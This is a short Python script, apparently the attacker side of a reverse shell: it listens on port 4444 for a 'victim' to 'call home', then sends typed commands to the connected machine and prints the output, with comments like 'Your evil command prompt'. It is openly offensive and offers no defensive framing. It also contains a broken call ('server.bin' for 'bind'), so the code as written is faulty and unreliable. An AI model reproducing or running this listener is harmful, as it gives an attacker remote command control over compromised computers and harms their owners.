import socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bin(("0.0.0.0", 4444))
server.listen(5)

print("[+] Waiting for victim to call home...")
client_socket, addr =server.accept()
print(f"[+] Victim connected from {addr}")

while True:
    command = input("shell> ")  # Your evil command prompt
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    # Get command output
    output = client_socket.recv(4096).decode()
    print(output)
